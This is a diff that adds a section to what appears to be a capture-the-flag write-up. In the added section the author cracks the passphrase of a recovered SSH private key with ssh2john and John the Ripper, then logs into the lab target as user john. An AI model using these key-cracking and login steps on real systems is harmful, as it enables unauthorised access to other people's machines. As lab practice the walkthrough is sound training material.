@@ -149,3 +149,31 @@ I try to ssh into the machine with this key but it wants a passphrase for the ke
 ```bash
 $ ssh john@target.thm -i secretKey
 ```
+
+## Getting a Foothold
+
+Since I don't have a passphrase for the ssh key, I'll need to crack it. I download ssh2john.py with the following command:
+
+```bash
+$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py
+```
+
+This programe will turn the ssh key into a format that john can understand. I run the following and save the hash as john_ssh:
+
+```bash
+$ python3 ssh2john.py secretKey > john_ssh
+```
+
+Now I have john crack the passphrase with the following command:
+
+```bash
+$ john --wordlist=dict.lst john_ssh
+```
+
+This gives me passphrase to crack the ssh key. I run the following command again to log into the server and type in the passphrase when asked:
+
+```bash
+$ ssh john@target.thm -i secretKey
+```
+
+I have a shell. I'm in!
